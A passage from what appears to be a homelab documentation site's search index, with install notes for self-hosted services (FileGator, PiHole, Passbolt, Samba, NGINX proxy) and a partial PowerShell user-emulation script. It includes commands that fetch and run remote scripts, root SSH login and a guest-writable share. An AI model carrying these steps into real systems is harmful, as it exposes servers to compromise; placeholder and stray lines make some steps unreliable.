root@filegator:/etc/ssl/filegator/filegator.crt\n### scp &lt;cert&gt;.key root@filegator:/etc/ssl/filegator/filegator.key\n##### End SSL certificate steps\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Installations/FileGator/#bonus-adjust-maximum-file-size","title":"Bonus: Adjust Maximum File Size","text":"<pre><code># Modify configuration file to allow for larger file uploads\nin /var/www/filegator/configuration.php\n-------------------------------\n'upload_max_size' =&gt; 10000 * 1024 * 1024, // 10,000MB (10GB)\n-------------------------------\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Installations/FileGator/#setup-apache","title":"Setup Apache","text":"<pre><code># Give the site write privileges\nchown -R www-data:www-data filegator/\nchmod -R 775 filegator/\n\n# Apache Configuration\na2enmod ssl\na2dissite 000-default.conf\na2ensite filegator.conf\nsystemctl enable apache2 --now\n</code></pre> <pre><code># Modify configuration file to allow for larger file uploads\n-------------------------------\n'upload_max_size' =&gt; 10000 * 1024 * 1024, // 10,000MB (10GB)\n-------------------------------\n\n##### These next steps are specifically for pulling SSL certificates\n# Enable SSH to SCP certificates into LXC\nnano /etc/ssh/sshd_config\n-------------------------------\nPermitRootLogin yes\n-------------------------------\nsystemctl start sshd\n\nmkdir /etc/ssl/filegator\n\n# Copy generated/downloaded SSL certificates from Host System\n### scp &lt;cert&gt;.crt root@filegator:/etc/ssl/filegator/filegator.crt\n### scp &lt;cert&gt;.key root@filegator:/etc/ssl/filegator/filegator.key\n##### End SSL certificate steps\n\n# Give the site write privileges\nchown -R www-data:www-data filegator/\nchmod -R 775 filegator/\n\n# Apache Configuration\na2enmod ssl\na2dissite 000-default.conf\na2ensite filegator.conf\nsystemctl enable apache2\n\n============================================\necho \"&lt;VirtualHost *:${server_port}&gt;\n    DocumentRoot /var/www/filegator/dist\n    #ServerName filegator\n        ${comment}SSLEngine on\n        ${comment}SSLCertificateFile ${cert_path}\n        ${comment}SSLCertificateKeyFile ${key_path}\n&lt;/VirtualHost&gt;\" &gt; /etc/apache2/sites-available/filegator.conf\n\nline=$(grep -n 'upload_max_size' /var/www/filegator/configuration.php | cut -f1 -d:)\nsed -i \"${line}s/100/${max_file_size}/\" /var/www/filegator/configuration.php\n\nsed \"s/'upload_max_size' =&gt; 100/'upload_max_size' =&gt; ${max_file_size}/\" /var/www/filegator/configuration.php\nsed \"s/100MB/100MB changed to ${max_file_size}MB/\" /var/www/filegator/configuration.php\nsed -i \"s/Listen 80/Listen sexy/\" /etc/apache2/ports.conf\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Installations/Homer/","title":"Homer","text":""},{"location":"Green%20Cell/02.%20Services/Installations/Homer/#overview","title":"Overview","text":"<p>Description here.</p>"},{"location":"Green%20Cell/02.%20Services/Installations/Homer/#installation","title":"Installation","text":"<p>Info</p> <p>Example LXC Hardware:  - CPU: 1 cores  - RAM: 512 MB  - HDD: 8 GB</p> <p>Installation will be done with the goal of avoiding docker, as well as over HTTPS with valid certificates.  For this, you can use OPNsense as a local CA and create local certificates for a homelab (example domain: <code>homelab</code>).</p> <pre><code># Update, Upgrade, and Dependencies\napt update &amp;&amp; apt upgrade -y\napt install -y nginx git unzip\n\n# Download, install, and clean-up Homer repository (+ custom Homer Theme)\nwget https://github.com/bastienwirtz/homer/releases/latest/download/homer.zip\ngit clone https://github.com/walkxcode/homer-theme\nmkdir /var/www/homer\nunzip homer.zip -d /var/www/homer\ncp -rf homer-theme/assets /var/www/homer\nrm -rf homer.zip homer-theme\n\n\n# Basic Configuration\nnano /etc/nginx/sites-enabled/default\n-------------------------------\nserver { \n    listen 443 ssl default_server;\n    listen [::]:443 ssl default_server;\n\n    ssl on;\n    ssl_certificate /etc/ssl/homer/homer.crt\n    ssl_certificate_key /etc/ssl/homer/homer.key\n\n    root /var/www/homer;\n    index index.html index.htm index.nginx-debian.html;\n    server_name homer;\n}\n-------------------------------\n# Give the site write privileges\nchown -R www-data:www-data /var/www/homer/\n\n\n##### These next steps are specifically for pulling SSL certificates\n# Enable SSH to SCP certificates into LXC\nnano /etc/ssh/sshd_config\n-------------------------------\nPermitRootLogin yes\n-------------------------------\nsystemctl start sshd\n\n\nmkdir /etc/ssl/home\n\n# Copy generated/downloaded SSL certificates from Host System\n### scp &lt;cert&gt;.crt root@&lt;homer_ip&gt;:/etc/ssl/homer/homer.crt\n### scp &lt;cert&gt;.key root@&lt;homer_ip&gt;:/etc/ssl/homer/homer.key\n##### End SSL certificate steps\n\n# Start Homer\nsystemctl enable nginx\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Installations/Organizr/","title":"Organizr","text":"<p>Notes created: 20SEP2022</p> <pre><code>### Hardware:  Given 1CPU, 512MB RAM, 4GB HDD\n\n# Update, Upgrade, and Dependencies\napt update &amp;&amp; apt upgrade -y\napt install -y nginx php php-fpm git\n\n# Download, install, and clean-up FileGator repository\ngit clone https://github.com/causefx/Organizr /var/www/organizr\n\nnano /etc/nginx/sites-enabled/default\n-------------------------------\nserver { \n    # SSL Configuration\n    listen 443 ssl default_server;\n    listen [::]:443 ssl default_server;\n\n    ssl on;\n\n    ssl_certificate /etc/ssl/organizr/organizr.crt\n    ssl_certificate_key /etc/ssl/organizr/organizr.key\n\n    # Root directory\n    root /var/www/organizr;\n\n    # Add index.php to this list if you are using PHP\n    index index.html index.htm index.nginx-debian.html index.php;\n\n    # Specify the desired domain name\n    server_name organizr;\n\n    location / { try_files $uri $uri/ =404; }\n\n    location ~ \\.php$ {\n        include snippets/fastcgi-php.conf;\n        # Default socket is php7.4-fpm.sock, change this to whatever version PHP is being used\n        fastcgi_pass unix:/run/php/php8.1-fpm.sock;\n    }\n\n    # Add this section\n    location /api/v2 { try_files $uri /api/v2/index.php$is_args$args; }\n}\n-------------------------------\n# Give the site write privileges\nchown -R www-data:www-data /var/www/organizr/\n\n# Install extra Organizr dependencies\napt install -y php-sqlite3 php-zip php-curl php-xml\n\n# Enable SSH to SCP certificates into LXC\nnano /etc/ssh/sshd_config\n-------------------------------\nPermitRootLogin yes\n-------------------------------\nsystemctl start sshd\n\nmkdir /etc/ssl/organizr\n# Copy generated/downloaded SSL certificates from Host System\n### scp &lt;cert&gt;.crt root@&lt;organizr_ip&gt;:/etc/ssl/organizr/organizr.crt\n### scp &lt;cert&gt;.key root@&lt;organizr_ip&gt;:/etc/ssl/organizr/organizr.key\n\n# Start Organizr\nsystemctl start nginx\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Installations/Passbolt/","title":"Passbolt","text":"<p>Notes created: 08JUN2023</p> <pre><code>=========================\nPASSBOLT LXC INSTALLATION\n=========================\n## Using Ubuntu 22.04 ##\n\n\n# Configure SSH\nsed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/g' /etc/ssh/sshd_config\nsystemctl enable ssh --now\n\nmkdir /etc/ssl/passbolt\n\n### On Host ###\n\n# Create Server Certificates from your internal Certificate Authority\n(1) Include common name, DNS, IP, and URI.\n(2) Download user certificate (.crt)\n(3) Download user private key (.key)\n\nscp .\\Passbolt+Certificate.crt root@passbolt:/etc/ssl/passbolt/passbolt.crt\nscp .\\Passbolt+Certificate.key root@passbolt:/etc/ssl/passbolt/passbolt.key\n\n### SSH to Server\n\n# Update\napt update &amp;&amp; apt upgrade -y\n\n# Download Dependencies, SHA512SUM, Install, and Cleanup\nwget \"https://download.passbolt.com/ce/installer/passbolt-repo-setup.ce.sh\"\nwget https://github.com/passbolt/passbolt-dep-scripts/releases/latest/download/passbolt-ce-SHA512SUM.txt\n\nsha512sum -c passbolt-ce-SHA512SUM.txt &amp;&amp; bash ./passbolt-repo-setup.ce.sh || echo \\\"Bad checksum. Aborting\\\" &amp;&amp; rm -f passbolt-repo-setup.ce.sh\n\nrm -f passbolt-repo-setup.ce.sh passbolt-ce-SHA512SUM.txt\napt install figlet passbolt-ce-server -y\n\n\n==========\nGUI CONFIG\n==========\nMySQL\n-----\nMySQL Admin User:   root (default)\nMySQL Admin Password:   NULL (default)\nMySQL Passbolt User:    passboltadmin (default)\nPassbolt Database:  passboltdb (default)\n\nManual SSL Config\n-----------------\nDomain:     &lt;ip_address&gt;\nSSL Cert:   /etc/ssl/passbolt/passbolt.crt\nSSL Key:    /etc/ssl/passbolt/passbolt.key\n\nOpenPGP Key (doesn't matter)\n-----------\nServer Name:    passbolt.pen15\nServer Email:   passbolt@example.com\n\nEmail Configuration (doesn't matter)\n-------------------\nSender Name:    Passbolt\nSender Email:   passbolt@example.com\nSMTP Host:  smtp.passbolt.pen15\n\nUser\n----\n&lt;username&gt;@example.com\n\n\n=================================\nCUSTOM SCRIPTS BECAUSE FUCK EMAIL\n=================================\n---------------\nrecover_user.sh\n---------------\n#!/bin/bash\n\n# Author: Tyler McCann (tylerdotrar)\n# Arbitrary Version Number: 1.0.0\n# Link: https://github.com/tylerdotrar/&lt;tbd&gt;\n\nDomain=\"https://passbolt.pen15\"\n\nfiglet \"Passbolt\"\necho \"$(tput setaf 3)Input Username:$(tput setaf 7)\"\nread Username\necho\n\nOutput=$(su -c \"/usr/share/php/passbolt/bin/cake passbolt recover_user --create --username $Username\" -s /bin/bash www-data) || exit 1\nRecovery=$(echo $Output | awk '{print $NF}' | tail -n 1)\n\necho \"$(tput setaf 3)Recovery Link:$(tput setaf 7)\"\necho \"$Domain$Recovery\"\n``\n\n\n----------------\nregister_user.sh\n----------------\n#!/bin/bash\n\n# Author: Tyler McCann (tylerdotrar)\n# Arbitrary Version Number: 1.0.0\n# Link: https://github.com/tylerdotrar/&lt;tbd&gt;\n\nDomain=\"https://passbolt.pen15\"\n\nfiglet \"Passbolt\"\necho \"$(tput setaf 3)Input Username:$(tput setaf 7)\"\nread Username\necho\necho \"$(tput setaf 3)Input First Name:$(tput setaf 7)\"\nread Fname\necho\necho \"$(tput setaf 3)Input Last Name:$(tput setaf 7)\"\nread Lname\necho\necho \"$(tput setaf 3)Input Role ('admin' or 'user'):$(tput setaf 7)\"\nread Role\necho\n\nOutput=$(su -c \"/usr/share/php/passbolt/bin/cake passbolt register_user -u $Username -f $Fname -l $Lname -r $Role\" -s /bin/bash www-data) || exit 1\nRegister=$(echo $Output | awk '{print $NF}' | tail -n 1)\n\necho \"$(tput setaf 3)Registration Link:$(tput setaf 7)\"\necho \"$Domain$Register\"\n``\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Installations/PiHole/","title":"PiHole","text":"<p>Notes created: 23MAR2023</p> <p>NEEDS TO BE IRONED OUT</p> <pre><code># Update System\nsudo apt update &amp;&amp; sudo apt upgrade -y\n\n# Install PiHole\nbash -c \"$(wget -qO- https://install.pi-hole.net)\"\n### https://docs.pi-hole.net/main/basic-install/\n\n# Set Password\npihole -a -p\n\n### Add adlists via CLI\n### PseudoCode\nfor ($URL in $List) {\n    sudo sqlite3 /etc/pihole/gravity.db \"INSERT INTO adlist (address, enabled, comment) VALUES ('$URL', 1, 'Comment Here');\"\n}\n\n# Update Gravity\npihole -g\n\n# Install Custom Certificate for HTTPS Web Portal\n\n### Generate Internal Server Certificate on OPNsense\n### Download Certificate and Key\n\n# Copy Certificate and Private Key to Server\nscp &lt;domain&gt;.crt &lt;user&gt;@&lt;hostname&gt;:/path/&lt;domain&gt;.crt\nscp &lt;domain&gt;.key &lt;user&gt;@&lt;hostname&gt;:/path/&lt;domain&gt;.key\n\n# Create bundled PEM certificate\ncat &lt;domain&gt;.key &lt;domain&gt;.crt &gt; &lt;domain&gt;-bundle.pem\n\n# Move Bundled Certificate to lighttpd Directory\nsudo mkdir /etc/lighttpd/certs\nsudo cp &lt;domain&gt;-bundle.pem /etc/lighttpd/certs/&lt;domain&gt;-bundle.pem\n\n# Modify 'external.conf' (because 'lighttpd.conf' will be overwritten by Pi-Hole updates)\nsudo nano /etc/lighttpd/external.conf\n``\nserver.modules += ( \"mod_openssl\" )\n\n$HTTP[\"host\"] == \"&lt;domain&gt;\" {\n  # Ensure the Pi-hole Block Page knows that this is not a blocked domain\n  setenv.add-environment = (\"fqdn\" =&gt; \"true\")\n\n  # Enable the SSL engine with a cert, only for this specific host\n  $SERVER[\"socket\"] == \":443\" {\n    ssl.engine = \"enable\"\n    ssl.pemfile = \"/etc/lighttpd/certs/&lt;domain&gt;-bundle.pem\"\n    ssl.honor-cipher-order = \"enable\"\n    ssl.cipher-list = \"EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH\"\n    ssl.use-sslv2 = \"disable\"\n    ssl.use-sslv3 = \"disable\"       \n  }\n\n  # Redirect HTTP to HTTPS\n  $HTTP[\"scheme\"] == \"http\" {\n    $HTTP[\"host\"] =~ \".*\" {\n      url.redirect = (\".*\" =&gt; \"https://%0$0\")\n    }\n  }\n}\n``\n\n# Restart the lighttpd service\nsudo service lighttpd restart\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Installations/Samba%20Share/","title":"Samba Share","text":"<p>Notes Updated: 26AUG2023</p> <pre><code># ========================\n# SAMBA SHARE INSTALLATION\n# ========================\n\napt update &amp;&amp; apt upgrade -y\napt install samba\nmkdir /SHARE\n\n# Password-less Authentication\nuseradd --system shareuser\nchown -R shareuser /SHARE\n\necho \"\n[ShareName]\n  path = /SHARE\n  browseable = yes\n  writeable = yes\n  read only = no\n  guest ok = yes\n  guest account = shareuser\n  create mask = 0644\n  directory mask = 0755\n  force user = shareuser\n  hide dot files = no\n  acl allow execute always = true\n\" &gt;&gt; /etc/samba/smb.conf\n\nsystemctl enable smbd --now\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Installations/Stable-Diffusion%20Web%20UI/","title":"Stable Diffusion Web UI","text":"<p>Recommended Resources for CPU: - at least 4 cores, 4GB memory, 30GB</p> <pre><code># Updates &amp; Dependencies\nsudo apt update &amp;&amp; sudo apt upgrade -y\nsudo apt install wget git python3 python3-venv libgl1 libglib2.0-0 libgoogle-perftools4 libtcmalloc-minimal4 -y\n\n# Non-Root User Requirements\nmkdir /var/www/stable-diffusion --parents\nuseradd -d /var/www/stable-diffusion webui\nsu webui\ncd ~\n\n# Installation\nwget -q https://raw.githubusercontent.com/AUTOMATIC1111/stable-diffusion-webui/master/webui.sh\nchmod +x webui.sh\n\n# No GPU\n./webui.sh --use-cpu all --precision full --no-half --skip-torch-cuda-test --listen --port 8080\n\n# Sampling Method: LMS\n# Sampling Steps: 40\n# CFG Scale: 8\n# Completion Time: ~ 3 mins\n\n# Sampling Method: DPM++ 2M Karras\n# Sampling Steps: 25\n# CFG Scale: 10\n# Completion Time: ~ 2 mins\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Installations/Template/","title":"Template","text":""},{"location":"Green%20Cell/02.%20Services/Installations/Template/#overview","title":"Overview","text":"<p>Info</p> <p>The Service Github repository can be found here.</p> <p>Service is a free, open-source, self-hosted... </p> <p></p>"},{"location":"Green%20Cell/02.%20Services/Installations/Template/#installation","title":"Installation","text":"<p>Info</p> <p>Example LXC Hardware:  - CPU: # cores  - RAM: # MB  - HDD: # GB</p> <p>Installation will be done with the goal of avoiding Docker, as well as (optionally) have valid HTTPS certificates to make the service feel more refined.</p>"},{"location":"Green%20Cell/02.%20Services/Installations/Template/#method-1-scripted-installation","title":"Method 1: Scripted Installation","text":"<p>For scripted installation, my ProxmoxMaster repository can be utilized.</p> <pre><code>bash -c \"$(wget -qO- https://github.com/tylerdotrar/ProxmoxMaster/raw/main/services/&lt;service&gt;.sh)\"\n</code></pre> <p></p>"},{"location":"Green%20Cell/02.%20Services/Installations/Template/#method-2-manual-installation","title":"Method 2: Manual Installation","text":""},{"location":"Green%20Cell/02.%20Services/Installations/Template/#dependencies-downloads","title":"Dependencies &amp; Downloads","text":"<pre><code># Update, Upgrade, and Dependencies\napt update &amp;&amp; apt upgrade -y\napt install -y \n\n# Download, install, and clean-up Service\nuhhh....\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Installations/Template/#site-configuration","title":"Site Configuration","text":"<p>Once dependencies are installed, next is site configuration.  Do you want to run a simple HTTP site or do you want to go the extra mile and have a clean HTTPS setup?  For the latter, you can use OPNsense as a local CA and create local certificates for a homelab environment (example domain: <code>homelab</code>).</p> <p>(Note: alternatively you can use an NGINX reverse proxy for HTTPS support)</p>"},{"location":"Green%20Cell/02.%20Services/Installations/Template/#option-1-http","title":"Option 1: HTTP","text":"<p>This configuration will allow you to access the site on port 80, with no further configuration.</p> <pre><code># HTTP Site Configuration\nuhhh....\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Installations/Template/#option-2-https","title":"Option 2: HTTPS","text":"<p>This configuration will allow you to access the site with a valid SSL certificate on port 443, but does require further configuration.</p> <pre><code># HTTPS Site Configuration\nuhhh....\n</code></pre> <p>For the above HTTPS configuration..</p> <pre><code># Enable SSH to SCP certificates into LXC\nnano /etc/ssh/sshd_config\n-------------------------------\nPermitRootLogin yes\n-------------------------------\nsystemctl start sshd\n\n    mkdir /etc/ssl/filegator\n\n# Copy generated/downloaded SSL certificates from Host System\n### scp &lt;cert&gt;.crt root@filegator:/etc/ssl/filegator/filegator.crt\n### scp &lt;cert&gt;.key root@filegator:/etc/ssl/filegator/filegator.key\n##### End SSL certificate steps\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Installations/Template/#bonus-might-not-exist","title":"Bonus: Might not Exist","text":"<pre><code># Bonus Stuff Here\nuhhh....\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Installations/Template/#finish-setup","title":"Finish Setup","text":"<pre><code>uhhh....\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Web%20Configurations/NGINX%20Reverse%20Proxy/","title":"NGINX Reverse Proxy","text":""},{"location":"Green%20Cell/02.%20Services/Web%20Configurations/NGINX%20Reverse%20Proxy/#overview","title":"Overview","text":"<p>A reverse proxy is a server that sits in front of web servers and forwards client (e.g. web browser) requests to those web servers.  A reverse proxy allows multiple sites on different servers to be accessed through a single IP address, as well as centralize &amp; simplify SSL certificate usage (e.g., individual servers can run over different HTTP ports, while the proxy forces clients to use HTTPS).</p> <p><pre><code>flowchart LR\n\nA(Client A)\nB(Client B)\nC{Reverse Proxy&lt;br&gt;https://10.10.10.1:443}\nD(Server 1&lt;br&gt;http://10.10.10.2:8080)\nE(Server 2&lt;br&gt;http://10.10.10.3:8006)\n\nA --&gt; | I want: https://server2:443 | C\nB --&gt; | I want: https://server1:443 | C\nC --&gt; | Client B wants you! | D\nC --&gt; | Client A wants you! | E</code></pre> (Note: in the above diagram, the DNS records for <code>server1</code> and <code>server2</code> point to <code>10.10.10.1</code>)</p>"},{"location":"Green%20Cell/02.%20Services/Web%20Configurations/NGINX%20Reverse%20Proxy/#example-configuration","title":"Example Configuration","text":"<p>To configure NGINX as a reverse proxy to redirect to your internal services while utilizing HTTPS on port 443, you can follow these steps. Assuming you already have NGINX installed (<code>sudo apt install nginx</code>), here's a basic configuration example for most use cases:</p>"},{"location":"Green%20Cell/02.%20Services/Web%20Configurations/NGINX%20Reverse%20Proxy/#1-create-ssl-certificates","title":"1. Create SSL Certificates","text":"<ul> <li>You'll need SSL/TLS certificates for your domain and each internal service you want to proxy. You can obtain free certificates from Let's Encrypt using Certbot.  Alternatively, you can use OPNsense as a local CA and create local certificates for a homelab (example domain: <code>homelab</code>).<ul> <li>Note: the homelab certificate should be for your proxy's IP and target service's domain name (e.g., <code>server_name</code>).  Failure to do so will result in a \"Certificate is not valid\" error.</li> </ul> </li> </ul>"},{"location":"Green%20Cell/02.%20Services/Web%20Configurations/NGINX%20Reverse%20Proxy/#2-configure-nginx","title":"2. Configure NGINX","text":"<ul> <li> <p>Create a configuration file for NGINX that defines your reverse proxy settings. You can use the default NGINX configuration file located at <code>/etc/nginx/nginx.conf</code> or create a new one in <code>/etc/nginx/sites-available/</code>.</p> </li> <li> <p>Here's an example configuration file (<code>/etc/nginx/sites-available/reverse-proxy</code>):</p> </li> </ul> <pre><code>server {\n    listen 443 ssl;\n    server_name proxmox.homelab;\n\n    ssl_certificate /etc/nginx/ssl/proxmox.crt;\n    ssl_certificate_key /etc/nginx/ssl/proxmox.key;\n\n    location / {\n        proxy_pass https://&lt;proxmox_ip&gt;:8006;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header X-Forwarded-Proto $scheme;\n    }\n}\n\nserver {\n    listen 443 ssl;\n    server_name opnsense.homelab;\n\n    ssl_certificate /etc/nginx/ssl/opnsense.crt;\n    ssl_certificate_key /etc/nginx/ssl/opnsense.key;\n\n    location / {\n        proxy_pass http://&lt;opnsense_ip&gt;:80;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header X-Forwarded-Proto $scheme;\n    }\n}\n\n# Repeat the above server block(s) for other services (e.g., Wikijs, PiHole, etc).\n\nserver {\n    listen 443 ssl default_server;\n    server_name _;\n\n    ssl_certificate /etc/nginx/ssl/proxy.crt;\n    ssl_certificate_key /etc/nginx/ssl/proxy.key;\n\n    return 404;\n}\n</code></pre> <ul> <li>In this example, replace the certificates  (<code>.crt</code>) and certificate keys (<code>.key</code>) with the actual paths to your SSL certificate and private key files.</li> </ul>"},{"location":"Green%20Cell/02.%20Services/Web%20Configurations/NGINX%20Reverse%20Proxy/#3-create-symbolic-link","title":"3. Create Symbolic Link","text":"<ul> <li>Create symbolic links to your configuration file in the <code>/etc/nginx/sites-enabled/</code> directory: <pre><code>sudo ln -s /etc/nginx/sites-available/reverse-proxy /etc/nginx/sites-enabled/\n</code></pre></li> </ul>"},{"location":"Green%20Cell/02.%20Services/Web%20Configurations/NGINX%20Reverse%20Proxy/#4-test-configuration","title":"4. Test Configuration","text":"<ul> <li> <p>Check the NGINX configuration for syntax errors: <pre><code>sudo nginx -t\n</code></pre></p> </li> <li> <p>If there are no errors, reload NGINX to apply the changes: <pre><code>sudo systemctl reload nginx\n</code></pre></p> </li> </ul>"},{"location":"Green%20Cell/02.%20Services/Web%20Configurations/NGINX%20Reverse%20Proxy/#5-dns-configuration","title":"5. DNS Configuration","text":"<ul> <li>Ensure that DNS records for your proxied domains (e.g., <code>proxmox.homelab</code>, <code>opnsense.homelab</code>, etc.) all point to the IP address of the NGINX proxy server.</li> </ul>"},{"location":"Green%20Cell/02.%20Services/Web%20Configurations/NGINX%20Reverse%20Proxy/#6-firewall-rules","title":"6. Firewall Rules","text":"<ul> <li>Make sure your firewall allows incoming traffic on port 443, and that there are no firewall rules blocking your proxy from reaching your target servers.</li> </ul> <p>Now, your proxy should be setup to route traffic to internal services through a single host using HTTPS on port 443. Remember to renew your SSL certificates when needed and adjust the NGINX configuration if you add more services.</p>"},{"location":"Green%20Cell/02.%20Services/Web%20Configurations/Web%20Server%20HTTPS%20Configurations/","title":"Web Server HTTPS Configurations","text":""},{"location":"Green%20Cell/02.%20Services/Web%20Configurations/Web%20Server%20HTTPS%20Configurations/#pre-requisites","title":"Pre-Requisites","text":"<p>For HTTPS support, obviously we will need certificates.  For this, you can use OPNsense as a local CA and create local certificates for a homelab environment (example domain: <code>homelab</code>). </p> <p>(Note: alternatively you can use an NGINX reverse proxy for HTTPS support)</p> <pre><code># Create Server Certificates from your internal Certificate Authority\n(1) Include common name, DNS, IP, and URI.\n(2) Download the certificate (.crt)\n(3) Download the private key (.key)\n(3) Create a certificate bundle (.pem)\n--- cat &lt;servername&gt;.key &lt;servername&gt;.crt &gt; &lt;servername&gt;-bundle.pem\n\n\n# Copy Certificates and Keys as needed\nscp &lt;servername&gt;.crt &lt;user&gt;@&lt;hostname&gt;:/path/&lt;servername&gt;.crt\nscp &lt;servername&gt;.key &lt;user&gt;@&lt;hostname&gt;:/path/&lt;servername&gt;.key\nscp &lt;servername&gt;-bundle.pem &lt;user&gt;@&lt;hostname&gt;:/path/&lt;servername&gt;-bundle.pem\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Web%20Configurations/Web%20Server%20HTTPS%20Configurations/#nginx","title":"Nginx","text":"<pre><code># Move Certificate and Key to Server\nsudo mkdir /etc/ssl/&lt;servername&gt;\nsudo cp &lt;servername&gt;.crt /etc/ssl/&lt;servername&gt;/&lt;servername&gt;.crt\nsudo cp &lt;servername&gt;.key /etc/ssl/&lt;servername&gt;/&lt;servername&gt;.key\n\n\n# Modify Available Site ('default' in this example)\necho \"server { \n    listen 443 ssl default_server;\n    listen [::]:443 ssl default_server;``\n\n    ssl_certificate /etc/ssl/&lt;servername&gt;/&lt;servername&gt;.crt\n    ssl_certificate_key /etc/ssl/&lt;servername&gt;/&lt;servername&gt;.key\n\n    root /var/www/&lt;servername&gt;;\n    # Adjust index files as needed\n    index index.html index.htm index.nginx-debian.html;\n    server_name &lt;domain&gt;;\n}\" &gt; /etc/nginx/sites-available/default\n\n\n# Restart the nginx service\nsudo systemctl nginx restart\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Web%20Configurations/Web%20Server%20HTTPS%20Configurations/#apache","title":"Apache","text":"<pre><code># Move Certificate and Key to Server\nsudo mkdir /etc/ssl/&lt;servername&gt;\nsudo cp &lt;servername&gt;.crt /etc/ssl/&lt;servername&gt;/&lt;servername&gt;.crt\nsudo cp &lt;servername&gt;.key /etc/ssl/&lt;servername&gt;/&lt;servername&gt;.key\n\n\n# Modify Available Site ('default' in this example)\necho \"\n&lt;VirtualHost *:443&gt;\n    DocumentRoot /var/www/&lt;servername&gt;\n    ServerName &lt;servername.com&gt;\n        SSLEngine on\n        SSLCertificateFile /etc/ssl/&lt;servername&gt;/&lt;servername&gt;.crt\n        SSLCertificateKeyFile /etc/ssl/&lt;servername&gt;/&lt;servername&gt;.key\n&lt;/VirtualHost&gt;\n\" &gt; /etc/apache2/sites-available/&lt;servername&gt;.conf\n\n\n# Restart the apache service\nsudo systemctl apache restart\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Web%20Configurations/Web%20Server%20HTTPS%20Configurations/#lighttpd","title":"Lighttpd","text":"<pre><code># Move Certificate Bundle to Server\nsudo mkdir /etc/ssl/&lt;servername&gt;\nsudo cp &lt;servername&gt;-bundle.pem /etc/ssl/&lt;servername&gt;/&lt;servername&gt;-bundle.pem\n\n\n# Modify 'external.conf' (because 'lighttpd.conf' will be overwritten by updates)\necho 'server.modules += ( \"mod_openssl\" )\n\n$HTTP[\"host\"] == \"&lt;servername.com&gt;\" {\n  # Ensure the Block Page knows that this is not a blocked domain\n  setenv.add-environment = (\"fqdn\" =&gt; \"true\")\n\n  # Enable the SSL engine with a cert, only for this specific host\n  $SERVER[\"socket\"] == \":443\" {\n    ssl.engine = \"enable\"\n    ssl.pemfile = \"/etc/ssl/&lt;servername&gt;/&lt;servername&gt;-bundle.pem\"\n    ssl.honor-cipher-order = \"enable\"\n    ssl.cipher-list = \"EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH\"\n    ssl.use-sslv2 = \"disable\"\n    ssl.use-sslv3 = \"disable\"       \n  }\n\n  # Redirect HTTP to HTTPS\n  $HTTP[\"scheme\"] == \"http\" {\n    $HTTP[\"host\"] =~ \".*\" {\n      url.redirect = (\".*\" =&gt; \"https://%0$0\")\n    }\n  }\n}' &gt; /etc/lighttpd/external.conf\n\n\n# Restart the lighttpd service\nsudo service lighttpd restart\n</code></pre>"},{"location":"Green%20Cell/03.%20%28WIP%29%20Range%20Development/","title":"(WIP) Range Development","text":"<ul> <li>This section is still in development, but eventually will contain walkthroughs for automated range development, from GHOSTS user emulation to CloudInit network and domain configurations.</li> </ul>"},{"location":"Green%20Cell/03.%20%28WIP%29%20Range%20Development/#table-of-contents","title":"Table of Contents","text":"<ul> <li>(WIP) User Emulation</li> </ul>"},{"location":"Green%20Cell/03.%20%28WIP%29%20Range%20Development/%28WIP%29%20User%20Emulation/","title":"(WIP) User Emulation","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Green%20Cell/03.%20%28WIP%29%20Range%20Development/%28WIP%29%20User%20Emulation/#wip-install-ghosts","title":"(WIP) Install GHOSTS","text":"<p>Github Link: - https://github.com/cmu-sei/GHOSTS</p>"},{"location":"Green%20Cell/03.%20%28WIP%29%20Range%20Development/%28WIP%29%20User%20Emulation/#auto-logon-random-user-accounts","title":"Auto-Logon Random User Accounts","text":"<pre><code>function Enable-UserEmulation {\n#.SYNOPSIS\n# Simple script to randomly generate and enable auto-logged on users.\n# ARBITRARY VERSION NUMBER:  1.0.0\n# AUTHOR:  Tyler McCann (@tylerdotrar)\n#\n#.DESCRIPTION\n# WIP\n# - Requires elevated privileges.\n# - Requires .NET 4.6.1 Runtime or later (https://dotnet.microsoft.com/download/dotnet-framework/net47)\n#\n# Parameters:\n#    -Manual         --&gt;   Prompt for user information instead of random generation\n#    -Username       --&gt;   Input username without prompt\n#    -Password       --&gt;   Input password without prompt (warning: plaintext)\n#    -DisplayName    --&gt;   Input display name without prompt (e.g., full name)\n#    -Cleanup        --&gt;   Remove all script files once user emulation is setup\n#    -Restart        --&gt;   Restart computer immediately upon script completion\n#    -Help           --&gt;   Return Get-Help information\n#\n#.LINK\n# https://github.com/tylerdotrar/&lt;TBD&gt;\n\n    Param(\n        [switch]$Manual,\n        [string]$Username,\n        [string]$Password,\n        [string]$DisplayName,\n        [switch]$Cleanup,\n        [switch]$Restart,\n        [switch]$Help\n    )\n\n\n    # Return Get-Help information\n    if ($Help) { return (Get-Help Enable-UserEmulation) }\n\n\n    # Verify current user has elevated privileges\n    $User    = [Security.Principal.WindowsIdentity]::GetCurrent();\n    $isAdmin = (New-Object Security.Principal.WindowsPrincipal $User).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)\n    if (!$isAdmin) { return (Write-Host 'This function requires elevated privileges.' -ForegroundColor Red) }\n\n\n    # Error correction if 